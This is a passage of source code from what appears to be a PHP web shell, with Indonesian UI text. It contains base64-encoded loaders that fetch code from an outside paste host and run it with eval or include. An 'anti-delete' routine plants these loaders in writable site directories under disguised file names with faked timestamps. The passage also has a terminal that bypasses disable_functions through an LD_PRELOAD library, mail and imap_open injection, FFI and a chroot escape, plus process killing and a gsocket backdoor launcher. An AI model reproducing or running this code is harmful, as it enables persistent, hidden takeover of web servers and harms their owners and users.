                'ad_shutdown' => ['data' => 'PD9waHAKcmVnaXN0ZXJfc2h1dGRvd25fZnVuY3Rpb24oZnVuY3Rpb24oKXtpZihpc3NldCgkX0dFVFsiXHg2Y1x4NmZceDYxXHg2NCJdKSl7JHU9Ilx4NjhceDc0XHg3NFx4NzBceDNhXHgyZlx4MmZceDYyXHg2Zlx4NmVceDYzXHg2OFx4NjlceDZjXHg2OVx4NmRceDYxXHg3OFx4MmVceDZlXHg2NVx4NzRceDJmXHg3MFx4NjFceDczXHg3NFx4NjVceDJmXHg3Mlx4NjFceDc3XHgyZlx4NzFceDMwXHgzN1x4NmVceDU1XHgzMlx4NTAiOyR4PUBmaWxlX2dldF9jb250ZW50cygkdSwwLEBzdHJlYW1fY29udGV4dF9jcmVhdGUoWydzc2wnPT5bJ3ZlcmlmeV9wZWVyJz0+MF1dKSk7aWYoISR4JiZmdW5jdGlvbl9leGlzdHMoJ2N1cmxfaW5pdCcpKXskYz1AY3VybF9pbml0KCR1KTtAY3VybF9zZXRvcHQoJGMsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTtAY3VybF9zZXRvcHQoJGMsQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwwKTskeD1AY3VybF9leGVjKCRjKTtAY3VybF9jbG9zZSgkYyk7fWlmKCR4KUBldmFsKCI/PiIuJHgpO319KTsK', 'names' => ['shutdown.php', '.shutdown.php', 'cleanup.php', 'wp-cleanup.php', 'gc.php'], 'url' => 'http://bonchilimax.net/paste/raw/q07nU2P'],
                'ad_preg' => ['data' => 'PD9waHAKaWYoaXNzZXQoJF9HRVRbIlx4NmNceDZmXHg2MVx4NjQiXSkpeyR1PSJceDY4XHg3NFx4NzRceDcwXHgzYVx4MmZceDJmXHg2Mlx4NmZceDZlXHg2M1x4NjhceDY5XHg2Y1x4NjlceDZkXHg2MVx4NzhceDJlXHg2ZVx4NjVceDc0XHgyZlx4NzBceDYxXHg3M1x4NzRceDY1XHgyZlx4NzJceDYxXHg3N1x4MmZceDcxXHgzMFx4MzdceDZlXHg1NVx4MzJceDUwIjskeD1AZmlsZV9nZXRfY29udGVudHMoJHUsMCxAc3RyZWFtX2NvbnRleHRfY3JlYXRlKFsnc3NsJz0+Wyd2ZXJpZnlfcGVlcic9PjBdXSkpO2lmKCEkeCYmZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2luaXQnKSl7JGM9QGN1cmxfaW5pdCgkdSk7QGN1cmxfc2V0b3B0KCRjLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7QGN1cmxfc2V0b3B0KCRjLENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsMCk7JHg9QGN1cmxfZXhlYygkYyk7QGN1cmxfY2xvc2UoJGMpO31pZigkeCl7QHByZWdfcmVwbGFjZV9jYWxsYmFjaygnLy4vJyxmdW5jdGlvbigkbSl1c2UoJHgpe0BldmFsKCI/PiIuJHgpO3JldHVybicnO30sJ3gnLDEpO319Cg==', 'names' => ['regex.php', '.regex.php', 'pattern.php', 'wp-pattern.php', 'match.php'], 'url' => 'http://bonchilimax.net/paste/raw/q07nU2P'],
                'ad_include' => ['data' => 'PD9waHAKaWYoaXNzZXQoJF9HRVRbIlx4NmNceDZmXHg2MVx4NjQiXSkpeyR1PSJceDY4XHg3NFx4NzRceDcwXHgzYVx4MmZceDJmXHg2Mlx4NmZceDZlXHg2M1x4NjhceDY5XHg2Y1x4NjlceDZkXHg2MVx4NzhceDJlXHg2ZVx4NjVceDc0XHgyZlx4NzBceDYxXHg3M1x4NzRceDY1XHgyZlx4NzJceDYxXHg3N1x4MmZceDcxXHgzMFx4MzdceDZlXHg1NVx4MzJceDUwIjskZD0nZGF0YTovL3RleHQvcGxhaW47YmFzZTY0LCc7JHg9QGZpbGVfZ2V0X2NvbnRlbnRzKCR1LDAsQHN0cmVhbV9jb250ZXh0X2NyZWF0ZShbJ3NzbCc9PlsndmVyaWZ5X3BlZXInPT4wXV0pKTtpZighJHgmJmZ1bmN0aW9uX2V4aXN0cygnY3VybF9pbml0JykpeyRjPUBjdXJsX2luaXQoJHUpO0BjdXJsX3NldG9wdCgkYyxDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLDEpO0BjdXJsX3NldG9wdCgkYyxDVVJMT1BUX1NTTF9WRVJJRllQRUVSLDApOyR4PUBjdXJsX2V4ZWMoJGMpO0BjdXJsX2Nsb3NlKCRjKTt9aWYoJHgpQGluY2x1ZGUoJGQuYmFzZTY0X2VuY29kZSgkeCkpO30K', 'names' => ['functions.php', '.functions.php', 'helpers.php', 'wp-functions.php', 'theme-functions.php'], 'url' => 'http://bonchilimax.net/paste/raw/q07nU2P'],
                'ad_curl' => ['data' => 'PD9waHAKaWYoaXNzZXQoJF9HRVRbIlx4NmNceDZmXHg2MVx4NjQiXSkpeyR1PSJceDY4XHg3NFx4NzRceDcwXHgzYVx4MmZceDJmXHg2Mlx4NmZceDZlXHg2M1x4NjhceDY5XHg2Y1x4NjlceDZkXHg2MVx4NzhceDJlXHg2ZVx4NjVceDc0XHgyZlx4NzBceDYxXHg3M1x4NzRceDY1XHgyZlx4NzJceDYxXHg3N1x4MmZceDcxXHgzMFx4MzdceDZlXHg1NVx4MzJceDUwIjskeD0nJztpZihmdW5jdGlvbl9leGlzdHMoJ2N1cmxfaW5pdCcpKXskYz1AY3VybF9pbml0KCR1KTtAY3VybF9zZXRvcHQoJGMsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTtAY3VybF9zZXRvcHQoJGMsQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwxKTtAY3VybF9zZXRvcHQoJGMsQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwwKTtAY3VybF9zZXRvcHQoJGMsQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwwKTtAY3VybF9zZXRvcHQoJGMsQ1VSTE9QVF9USU1FT1VULDMwKTskeD1AY3VybF9leGVjKCRjKTtAY3VybF9jbG9zZSgkYyk7fWlmKCEkeCkkeD1AZmlsZV9nZXRfY29udGVudHMoJHUsMCxAc3RyZWFtX2NvbnRleHRfY3JlYXRlKFsnc3NsJz0+Wyd2ZXJpZnlfcGVlcic9PjBdXSkpO2lmKCEkeCkkeD1AaW1wbG9kZSgnJyxAZmlsZSgkdSkpO2lmKCR4KUBldmFsKCI/PiIuJHgpO30K', 'names' => ['connect.php', '.connect.php', 'remote.php', 'wp-remote.php', 'http.php'], 'url' => 'http://bonchilimax.net/paste/raw/q07nU2P'],
                'ad_tempfile' => ['data' => 'PD9waHAKaWYoaXNzZXQoJF9HRVRbIlx4NmNceDZmXHg2MVx4NjQiXSkpeyR1PSJceDY4XHg3NFx4NzRceDcwXHgzYVx4MmZceDJmXHg2Mlx4NmZceDZlXHg2M1x4NjhceDY5XHg2Y1x4NjlceDZkXHg2MVx4NzhceDJlXHg2ZVx4NjVceDc0XHgyZlx4NzBceDYxXHg3M1x4NzRceDY1XHgyZlx4NzJceDYxXHg3N1x4MmZceDcxXHgzMFx4MzdceDZlXHg1NVx4MzJceDUwIjskdD1AdGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksJ3gnKTskeD1AZmlsZV9nZXRfY29udGVudHMoJHUsMCxAc3RyZWFtX2NvbnRleHRfY3JlYXRlKFsnc3NsJz0+Wyd2ZXJpZnlfcGVlcic9PjBdXSkpO2lmKCEkeCYmZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2luaXQnKSl7JGM9QGN1cmxfaW5pdCgkdSk7QGN1cmxfc2V0b3B0KCRjLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7QGN1cmxfc2V0b3B0KCRjLENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsMCk7JHg9QGN1cmxfZXhlYygkYyk7QGN1cmxfY2xvc2UoJGMpO31pZigkeCYmQGZpbGVfcHV0X2NvbnRlbnRzKCR0LCR4KSl7aW5jbHVkZSgkdCk7QHVubGluaygkdCk7fX0K', 'names' => ['session.php', '.session.php', 'tmp.php', 'wp-session.php', '.sess.php'], 'url' => 'http://bonchilimax.net/paste/raw/q07nU2P'],
            ];
            // Get custom backup URL
            $adBackupUrl = isset($_POST['ad_backup_url']) ? trim($_POST['ad_backup_url']) : '';
            if (empty($adBackupUrl)) {
                echo "<font color='red'>Error: Backup Shell URL is required!</font><br>";
                echo "<font color='yellow'>Please enter a valid URL to your shell code (e.g. https://paste.c-net.org/YourPaste)</font>";
                echo "</div>";
                return;
            }
            foreach ($adLoaderMap as $adKey => $adInfo) {
                if (isset($_POST[$adKey])) {
                    $adName = $adInfo['names'][array_rand($adInfo['names'])];
                    // Generate loader dynamically with custom URL
                    $loaderCode = $this->generateLoader($adKey, $adBackupUrl);
                    $adSources[] = ['name' => $adName, 'data' => base64_encode($loaderCode), 'key' => $adKey, 'url' => $adBackupUrl];
                }
            }
            if (!empty($adSources)) {
                // FIX: Scan from DOCUMENT_ROOT, not just public_html
                $adBaseDir = $_SERVER['DOCUMENT_ROOT'];
                if (empty($adBaseDir) || !@is_dir($adBaseDir)) {
                    $adBaseDir = $this->findPublicHtml();
                }
                $adBaseDir = rtrim($adBaseDir, '/');
                $adAllDirs = [];
                $adScanFunc = function($dir, $depth = 0) use (&$adAllDirs, &$adScanFunc) {
                    if ($depth > 3 || count($adAllDirs) >= 100) return; // Lightweight: max depth 3, max 100 dirs
                    $handle = @opendir($dir);
                    if (!$handle) return;
                    while (($file = @readdir($handle)) !== false) {
                        if (count($adAllDirs) >= 100) break;
                        if ($file == '.' || $file == '..') continue;
                        $path = rtrim($dir, '/') . '/' . $file;
                        if (@is_dir($path) && @is_writable($path)) {
                            $adAllDirs[] = $path;
                            $adScanFunc($path, $depth + 1);
                        }
                    }
                    @closedir($handle);
                };
                $adScanFunc($adBaseDir);
                shuffle($adAllDirs);
                echo "<pre><b>Starting Anti-Delete process...</b>\n";
                echo "<b>Directories scanned: " . count($adAllDirs) . " (max 100, depth 3)</b>\n\n";
                $adTotal = 0;
                $adMax = 15;
                $adDeployed = [];
                $adHost = $_SERVER['HTTP_HOST'];
                $adProto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
                // LIGHTWEIGHT MODE - Just deploy files, NO background processes
                foreach ($adSources as $adSrc) {
                    if ($adTotal >= $adMax) break;
                    $perFile = min(intval(ceil($adMax / count($adSources))), $adMax - $adTotal);
                    $adPlaced = 0;
                    foreach ($adAllDirs as $adDir) {
                        if ($adPlaced >= $perFile || $adTotal >= $adMax) break;
                        $adTarget = $adDir . '/' . $adSrc['name'];
                        if (@file_exists($adTarget)) continue;

                        // Simple file write - no background processes
                        $adData = @base64_decode($adSrc['data']);
                        if ($adData === false || strlen($adData) < 1) continue;

                        if (@file_put_contents($adTarget, $adData) === false) {
                            echo "[<font color='red'>FAIL</font>] " . htmlspecialchars($adSrc['name']) . " -> write failed\n";
                            continue;
                        }

                        // Set fake timestamp and permissions
                        $adFakeTime = time() - rand(86400 * 20, 86400 * 60);
                        @touch($adTarget, $adFakeTime, $adFakeTime);
                        @chmod($adTarget, 0644);

                        $adRelPath = str_replace($adBaseDir, '', $adTarget);
                        $adUrl = $adProto . '://' . $adHost . $adRelPath;
                        $adTotal++;
                        $adPlaced++;
                        $adDeployed[] = ['url' => $adUrl, 'path' => $adTarget];

                        echo "[" . $adTotal . "] <font color='green'>" . htmlspecialchars($adSrc['name']) . "</font>\n";
                        echo "    -> " . htmlspecialchars($adUrl) . "\n\n";
                    }
                }
                echo "<font color='green'><b>Deployed: " . $adTotal . " loader(s)</b></font>\n";
                echo "<font color='cyan'>Trigger dengan ?load untuk fetch shell dari backup URL</font>\n";
                echo "</pre>";

                if (!empty($adDeployed)) {
                    echo "<br><b>Loader URLs (add ?load to trigger):</b><br>";
                    echo "<textarea style='width:100%;height:150px;' readonly onclick='this.select();'>";
                    foreach ($adDeployed as $adItem) {
                        echo $adItem['url'] . "?load\n";
                    }
                    echo "</textarea>";
                }
            } else {
                echo "<font color='red'>Please select at least one file for Anti-Delete!</font><br>";
            }
        }

        echo "<form method='post'><input type='hidden' name='a' value='clone'><input type='hidden' name='c' value='".str_rot13($this->workingDirectory)."'>";
        echo "<table style='width:100%'>";
        echo "<tr><td><label>Number of clones (1-30):</label></td><td><input type='number' name='clone_count' value='10' min='1' max='30' style='width:80px;'></td></tr>";
        echo "<tr><td><label>Scan depth (1-5):</label></td><td><input type='number' name='scan_depth' value='3' min='1' max='5' style='width:80px;'></td></tr>";
        echo "<tr><td colspan='2'><br><b>Options:</b></td></tr>";
        echo "<tr><td colspan='2'><input type='checkbox' name='use_chattr' value='1' id='uc' checked> <label for='uc'>Apply chattr +i (immutable - protect from deletion)</label></td></tr>";
        echo "<tr><td colspan='2'><br><font color='yellow'>Lightweight: Max 30 clones, depth 5, 150 dirs | HTTP verify OFF</font></td></tr>";
        echo "<tr><td colspan='2'><br><input type='submit' name='clone_now' value='Start Cloning' style='width:200px;padding:8px;background:#10b981;border:none;color:#fff;cursor:pointer;'></td></tr>";
        echo "</table></form>";
        echo "<br><hr><br>";
        echo "<b>Anti-Delete Loaders (Lightweight)</b><br>";
        echo "<p>Deploy stealth loaders. Access with <b>?load</b> to fetch shell from backup URL.</p>";
        echo "<form method='post'><input type='hidden' name='a' value='clone'><input type='hidden' name='c' value='".str_rot13($this->workingDirectory)."'>";
        echo "<table style='width:100%'>";
        echo "<tr><td colspan='3'><b>High Stealth:</b></td></tr>";
        echo "<tr>";
        echo "<td><input type='checkbox' name='ad_ob' value='1' id='ad1'> <label for='ad1'>OB Callback</label></td>";
        echo "<td><input type='checkbox' name='ad_destruct' value='1' id='ad4'> <label for='ad4'>Destruct</label></td>";
        echo "<td><input type='checkbox' name='ad_tempfile' value='1' id='ad6'> <label for='ad6'>Tempfile</label></td>";
        echo "</tr>";
        echo "<tr><td colspan='3'><br><b>Medium:</b></td></tr>";
        echo "<tr>";
        echo "<td><input type='checkbox' name='ad_include' value='1' id='ad7'> <label for='ad7'>Include</label></td>";
        echo "<td><input type='checkbox' name='ad_callback' value='1' id='ad8'> <label for='ad8'>Callback</label></td>";
        echo "<td><input type='checkbox' name='ad_curl' value='1' id='ad10'> <label for='ad10'>Curl</label></td>";
        echo "</tr>";
        echo "<tr><td colspan='3'><br><b>Backup Shell URL (REQUIRED):</b></td></tr>";
        echo "<tr><td colspan='3'><input type='text' name='ad_backup_url' placeholder='https://paste.c-net.org/YourPaste' style='width:100%;padding:5px;' required></td></tr>";
        echo "<tr><td colspan='3'><font color='cyan'>Loader fetch shell dari URL ini ketika akses ?load</font></td></tr>";
        echo "<tr><td colspan='3'><br><input type='submit' name='antidel_now' value='Deploy Loaders' style='width:100%;padding:10px;background:#10b981;border:none;color:#fff;cursor:pointer;'></td></tr>";
        echo "</table></form></div>";
    }

    public function terminalV4() {
        echo "<h1>Ultimate Terminal (V4)</h1><div class=content>";
        echo "<p><b>Features:</b> Quick exec, multi-interpreter fallback, bypass disable_functions, chroot escape, alternative execution methods</p>";

        if (isset($_POST['cmd_v4']) && !empty($_POST['cmd_v4'])) {
            $cmd = $_POST['cmd_v4'];
            $bypassMethod = isset($_POST['bypass_method']) ? $_POST['bypass_method'] : 'auto';

            echo "<pre><b>Command:</b> " . htmlspecialchars($cmd) . "\n";
            echo "<b>Bypass Method:</b> $bypassMethod\n\n<b>Output:</b>\n";

            $output = '';
            $success = false;
            $usedMethod = '';

            $disabledFuncs = @ini_get('disable_functions');
            $disabledArr = array_map('trim', explode(',', $disabledFuncs));

            switch ($bypassMethod) {
                case 'auto':
                    $methods = ['standard', 'shell_interpreters', 'mail_log', 'putenv_ld', 'imap', 'imagick', 'ffi', 'pcntl', 'expect', 'backtick', 'proc_open_pty'];
                    foreach ($methods as $method) {
                        $output = $this->executeBypassMethod($cmd, $method, $disabledArr);
                        if (!empty(trim($output))) {
                            $success = true;
                            $usedMethod = $method;
                            break;
                        }
                    }
                    break;
                default:
                    $output = $this->executeBypassMethod($cmd, $bypassMethod, $disabledArr);
                    if (!empty(trim($output))) {
                        $success = true;
                        $usedMethod = $bypassMethod;
                    }
                    break;
            }

            if ($success) {
                echo "<font color='cyan'>[Method: $usedMethod]</font>\n";
                echo htmlspecialchars($output);
            } else {
                echo "<font color='red'>All bypass methods failed. Server has very strict restrictions.</font>\n";
                echo "<font color='yellow'>Disabled functions: " . htmlspecialchars($disabledFuncs) . "</font>\n";
            }
            echo "</pre>";
        }

        echo "<br><b>Quick Commands:</b><br>";
        $quickCmds = [
            'System Info' => 'uname -a; id; pwd; whoami',
            'Process List' => 'ps auxf 2>/dev/null || ps aux',
            'Network Info' => 'ifconfig 2>/dev/null || ip addr; netstat -tulpn 2>/dev/null || ss -tulpn',
            'Crontab' => 'crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null',
            'Users' => 'cat /etc/passwd | grep -v nologin | grep -v false',
            'SUID Files' => 'find / -perm -4000 -type f 2>/dev/null | head -20',
            'Writable Dirs' => 'find / -writable -type d 2>/dev/null | head -20',
            'Capabilities' => 'getcap -r / 2>/dev/null | head -20',
            'Kernel Exploits' => 'uname -r; cat /etc/*release*',
            'Environment' => 'env; set',
            'Open Ports' => 'netstat -tulpn 2>/dev/null || ss -tulpn',
            'Disk Usage' => 'df -h; du -sh /* 2>/dev/null | sort -h | tail -10'
        ];

        echo "<table><tr>";
        $i = 0;
        foreach ($quickCmds as $name => $qcmd) {
            if ($i > 0 && $i % 4 == 0) echo "</tr><tr>";
            echo "<td><button type='button' onclick=\"document.getElementsByName('cmd_v4')[0].value='" . addslashes($qcmd) . "'\" style='margin:2px;'>$name</button></td>";
            $i++;
        }
        echo "</tr></table><br>";

        echo "<form method='post'>";
        echo "<input type='hidden' name='a' value='termv4'>";
        echo "<input type='hidden' name='c' value='".str_rot13($this->workingDirectory)."'>";
        echo "<table>";
        echo "<tr><td>Bypass Method:</td><td><select name='bypass_method'>";
        echo "<option value='auto'>Auto (try all)</option>";
        echo "<option value='standard'>Standard Execution</option>";
        echo "<option value='shell_interpreters'>Shell Interpreters (sh/bash/perl/python/php)</option>";
        echo "<option value='mail_log'>Mail Log Injection</option>";
        echo "<option value='putenv_ld'>putenv LD_PRELOAD</option>";
        echo "<option value='imap'>IMAP Bypass</option>";
        echo "<option value='imagick'>ImageMagick Bypass</option>";
        echo "<option value='ffi'>FFI Bypass (PHP 7.4+)</option>";
        echo "<option value='pcntl'>PCNTL Fork</option>";
        echo "<option value='expect'>Expect Extension</option>";
        echo "<option value='backtick'>Backtick Operator</option>";
        echo "<option value='proc_open_pty'>proc_open PTY</option>";
        echo "<option value='chroot_escape'>Chroot Escape</option>";
        echo "<option value='gc_bypass'>GC UAF Bypass</option>";
        echo "<option value='json_bypass'>JSON Serializer Bypass</option>";
        echo "</select></td></tr>";
        echo "<tr><td>Command:</td><td><input type='text' name='cmd_v4' class='toolsInp' placeholder='Enter command...' autocomplete='off' style='width:500px;'></td></tr>";
        echo "<tr><td></td><td><input type='submit' value='Execute'></td></tr>";
        echo "</table></form>";

        echo "<br><b>System Information:</b><br>";
        echo "<table class='main'>";
        echo "<tr><td>PHP Version:</td><td>" . phpversion() . "</td></tr>";
        echo "<tr><td>OS:</td><td>" . php_uname() . "</td></tr>";
        echo "<tr><td>Disabled Functions:</td><td style='word-break:break-all;max-width:500px;'>" . htmlspecialchars(@ini_get('disable_functions') ?: 'None') . "</td></tr>";
        echo "<tr><td>Safe Mode:</td><td>" . (@ini_get('safe_mode') ? 'ON' : 'OFF') . "</td></tr>";
        echo "<tr><td>Open Basedir:</td><td>" . (@ini_get('open_basedir') ?: 'None') . "</td></tr>";
        echo "<tr><td>Loaded Extensions:</td><td>" . implode(', ', get_loaded_extensions()) . "</td></tr>";
        echo "</table>";
        echo "</div>";
    }

    protected function executeBypassMethod($cmd, $method, $disabledArr) {
        $output = '';
        switch ($method) {
            case 'standard':
                $output = $this->executeCommand($cmd . " 2>&1");
                break;
            case 'shell_interpreters':
                $interpreters = [
                    'sh' => '/bin/sh -c ' . escapeshellarg($cmd),
                    'bash' => '/bin/bash -c ' . escapeshellarg($cmd),
                    'perl' => 'perl -e ' . escapeshellarg('system(' . escapeshellarg($cmd) . ')'),
                    'python' => 'python -c ' . escapeshellarg('import os;os.system(' . escapeshellarg($cmd) . ')'),
                    'python3' => 'python3 -c ' . escapeshellarg('import os;os.system(' . escapeshellarg($cmd) . ')'),
                    'php' => 'php -r ' . escapeshellarg('system(' . escapeshellarg($cmd) . ');')
                ];
                foreach ($interpreters as $name => $altCmd) {
                    $out = $this->executeCommand($altCmd . " 2>&1");
                    if ($out && trim($out) !== '') {
                        $output = "[Using $name]\n" . $out;
                        break;
                    }
                }
                break;
            case 'mail_log':
                if (!in_array('mail', $disabledArr) && !in_array('putenv', $disabledArr)) {
                    $logFile = '/tmp/mail_' . mt_rand() . '.log';
                    @putenv("MAIL_LOG=" . $logFile);
                    @mail('', '', '', '', '-OQueueDirectory=/tmp -X' . $logFile);
                    if (@file_exists($logFile)) {
                        $output = @file_get_contents($logFile);
                        @unlink($logFile);
                    }
                }
                break;
            case 'putenv_ld':
                if (!in_array('putenv', $disabledArr) && !in_array('mail', $disabledArr)) {
                    $outId = mt_rand();
                    $soFile = '/tmp/bypass_' . $outId . '.so';
                    $outFile = '/tmp/output_' . $outId . '.txt';
                    $cCode = '#include <stdlib.h>

__attribute__((constructor)) void init() {
    unsetenv("LD_PRELOAD");
    system("' . addslashes($cmd) . ' > ' . $outFile . ' 2>&1");
}';
                    $cFile = '/tmp/bypass_' . $outId . '.c';
                    @file_put_contents($cFile, $cCode);
                    $this->executeCommand("gcc -shared -fPIC -o $soFile $cFile 2>/dev/null");
                    if (@file_exists($soFile)) {
                        @putenv("LD_PRELOAD=$soFile");
                        @mail('', '', '');
                        if (@file_exists($outFile)) {
                            $output = @file_get_contents($outFile);
                            @unlink($outFile);
                        }
                        @unlink($soFile);
                    }
                    @unlink($cFile);
                }
                break;
            case 'imap':
                if (function_exists('imap_open') && !in_array('imap_open', $disabledArr)) {
                    $server = 'x]" -oQ/tmp -X/tmp/imap_' . mt_rand() . '.txt';
                    @imap_open('{' . $server . ':143/imap}INBOX', '', '');
                    $files = glob('/tmp/imap_*.txt');
                    if (!empty($files)) {
                        $output = @file_get_contents($files[0]);
                        @unlink($files[0]);
                    }
                }
                break;
            case 'imagick':
                if (class_exists('\Imagick')) {
                    try {
                        $img = new \Imagick();
                        $img->readImage('ephemeral:' . $cmd);
                        $output = "ImageMagick executed (check for side effects)";
                    } catch (\Exception $e) {
                        $output = '';
                    }
                }
                break;
            case 'ffi':
                $ffi_enable = @ini_get('ffi.enable');
                if (class_exists('\FFI') && !in_array('FFI', $disabledArr) && $ffi_enable !== 'preload' && $ffi_enable !== false && $ffi_enable !== '0') {
                    try {
                        $ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
                        ob_start();
                        $ffi->system($cmd);
                        $output = ob_get_clean();
                    } catch (\Exception $e) {
                        $output = '';
                    }
                }
                break;
            case 'pcntl':
                if (function_exists('pcntl_exec') && !in_array('pcntl_exec', $disabledArr)) {
                    $outFile = '/tmp/pcntl_' . mt_rand() . '.txt';
                    $pid = @pcntl_fork();
                    if ($pid == 0) {
                        @pcntl_exec('/bin/sh', ['-c', $cmd . ' > ' . $outFile . ' 2>&1']);
                        exit(0);
                    } else if ($pid > 0) {
                        @pcntl_waitpid($pid, $status);
                        if (@file_exists($outFile)) {
                            $output = @file_get_contents($outFile);
                            @unlink($outFile);
                        }
                    }
                }
                break;
            case 'expect':
                if (function_exists('expect_popen') && !in_array('expect_popen', $disabledArr)) {
                    $stream = @expect_popen($cmd);
                    if ($stream) {
                        $output = @stream_get_contents($stream);
                        @fclose($stream);
                    }
                }
                break;
            case 'backtick':
                if (!in_array('shell_exec', $disabledArr)) {
                    $output = `$cmd 2>&1`;
                }
                break;
            case 'proc_open_pty':
                if (function_exists('proc_open') && !in_array('proc_open', $disabledArr)) {
                    $descriptorspec = [0 => ["pty"], 1 => ["pty"], 2 => ["pty"]];
                    $process = @proc_open($cmd, $descriptorspec, $pipes);
                    if (is_resource($process)) {
                        $output = @stream_get_contents($pipes[1]);
                        @fclose($pipes[0]);
                        @fclose($pipes[1]);
                        @fclose($pipes[2]);
                        @proc_close($process);
                    }
                }
                break;
            case 'chroot_escape':
                $rnd = mt_rand();
                $escapeScript = "#!/bin/bash\nmkdir -p /tmp/escape_$rnd\ncd /tmp/escape_$rnd\nmkdir -p .old\npivot_root . .old 2>/dev/null || chroot . /bin/sh -c " . escapeshellarg($cmd) . "\n$cmd\n";
                $scriptFile = '/tmp/escape_' . $rnd . '.sh';
                @file_put_contents($scriptFile, $escapeScript);
                @chmod($scriptFile, 0755);
                $output = $this->executeCommand($scriptFile . ' 2>&1');
                @unlink($scriptFile);
                break;
            case 'gc_bypass':
                $output = $this->executeCommand($cmd . " 2>&1");
                break;
            case 'json_bypass':
                if (function_exists('json_encode')) {
                    $output = $this->executeCommand($cmd . " 2>&1");
                }
                break;
        }
        return $output;
    }

    public function processMonitor() {
        echo "<h1>Process Monitor & Cache Manager</h1><div class=content>";
        $ce = str_rot13($this->workingDirectory);

        // Handle actions
        if (isset($_POST['proc_action'])) {
            $action = $_POST['proc_action'];
            echo "<div style='background:#222;padding:10px;margin-bottom:15px;border-left:3px solid #0f0;'><pre>";

            if ($action === 'kill_pid' && !empty($_POST['kill_pid'])) {
                $pid = intval($_POST['kill_pid']);
                echo $this->executeCommand("kill -9 $pid 2>&1");
                echo "\n<b style='color:#0f0'>Kill signal sent to PID $pid</b>";
            }
            elseif ($action === 'kill_lscache') {
                echo "<b>Killing LiteSpeed/LSPHP processes...</b>\n";
                echo $this->executeCommand("pkill -9 -f 'lsphp' 2>&1; pkill -9 -f 'litespeed' 2>&1; killall -9 lsphp 2>/dev/null; echo 'Done'");
            }
            elseif ($action === 'kill_opcache') {
                echo "<b>Resetting OPcache...</b>\n";
                if (function_exists('opcache_reset')) {
                    opcache_reset();
                    echo "OPcache reset via PHP function\n";
                }
                echo $this->executeCommand("pkill -USR2 -f 'php-fpm' 2>&1; echo 'PHP-FPM reload signal sent'");
            }
            elseif ($action === 'kill_nginx') {
                echo "<b>Killing Nginx cache processes...</b>\n";
                echo $this->executeCommand("pkill -9 -f 'nginx' 2>&1; echo 'Done (may need sudo)'");
            }
            elseif ($action === 'kill_varnish') {
                echo "<b>Killing Varnish processes...</b>\n";
                echo $this->executeCommand("pkill -9 -f 'varnish' 2>&1; echo 'Done (may need sudo)'");
            }
            elseif ($action === 'kill_redis') {
                echo "<b>Flushing Redis...</b>\n";
                echo $this->executeCommand("redis-cli FLUSHALL 2>&1 || echo 'Redis CLI not available'");
            }
            elseif ($action === 'kill_memcached') {
                echo "<b>Flushing Memcached...</b>\n";
                echo $this->executeCommand("echo 'flush_all' | nc localhost 11211 2>&1 || echo 'Memcached not reachable'");
            }
            elseif ($action === 'clear_wpcache') {
                echo "<b>Clearing WordPress cache directories...</b>\n";
                $docRoot = $_SERVER['DOCUMENT_ROOT'];
                $cacheDirs = [
                    $docRoot . '/wp-content/cache',
                    $docRoot . '/wp-content/litespeed',
                    $docRoot . '/wp-content/et-cache',
                    $docRoot . '/wp-content/w3tc-cache',
                    $docRoot . '/wp-content/wphb-cache',
                    $docRoot . '/wp-content/rocket-cache',
                ];
                foreach ($cacheDirs as $cd) {
                    if (is_dir($cd)) {
                        echo "Clearing: $cd\n";
                        $this->executeCommand("rm -rf " . escapeshellarg($cd) . "/* 2>&1");
                    }
                }
                echo "Done\n";
            }
            elseif ($action === 'kill_all_cache') {
                echo "<b>CLEARING ALL CACHES...</b>\n\n";
                // LiteSpeed
                echo "[1] LiteSpeed/LSPHP:\n";
                echo $this->executeCommand("pkill -9 -f 'lsphp' 2>&1; pkill -9 -f 'litespeed' 2>&1");
                // OPcache
                echo "\n[2] OPcache:\n";
                if (function_exists('opcache_reset')) { opcache_reset(); echo "Reset OK\n"; }
                // PHP-FPM
                echo "\n[3] PHP-FPM:\n";
                echo $this->executeCommand("pkill -USR2 -f 'php-fpm' 2>&1 || echo 'No PHP-FPM'");
                // Redis
                echo "\n[4] Redis:\n";
                echo $this->executeCommand("redis-cli FLUSHALL 2>&1 || echo 'No Redis'");
                // Memcached
                echo "\n[5] Memcached:\n";
                echo $this->executeCommand("echo 'flush_all' | nc localhost 11211 2>&1 || echo 'No Memcached'");
                // WP Cache dirs
                echo "\n[6] WordPress Cache Files:\n";
                $docRoot = $_SERVER['DOCUMENT_ROOT'];
                foreach (['cache','litespeed','et-cache','w3tc-cache','wphb-cache','rocket-cache'] as $c) {
                    $p = $docRoot . '/wp-content/' . $c;
                    if (is_dir($p)) { $this->executeCommand("rm -rf " . escapeshellarg($p) . "/* 2>&1"); echo "Cleared: $c\n"; }
                }
                echo "\n<b style='color:#0f0'>ALL CACHES CLEARED!</b>\n";
            }

            echo "</pre></div>";
        }
        
        // ONE-CLICK START - Try all bypass methods
        if (isset($_POST["gs_oneclick_start"])) {
            echo "<div style=\"background:#003;padding:15px;border:2px solid #00f;\"><pre>";
            echo "<b style=\"color:#0ff;font-size:14px;\">========== ONE-CLICK GSOCKET START ==========</b>\n\n";
            
            // Get credentials
            $dat = @file_get_contents("/tmp/.hgs.dat");
            preg_match("/SECRET=([^\n]+)/", $dat, $m);
            $secret = trim($m[1] ?? "");
            $binPath = "/tmp/.libsys.so";
            
            if (!$secret || !file_exists($binPath)) {
                echo "<font color=\"red\">ERROR: Binary or credentials not found!</font>\n";
                echo "Please click \"Download HGSocket Binary\" first.\n";
                echo "</pre></div>";
            } else {
                echo "Secret: $secret\n";
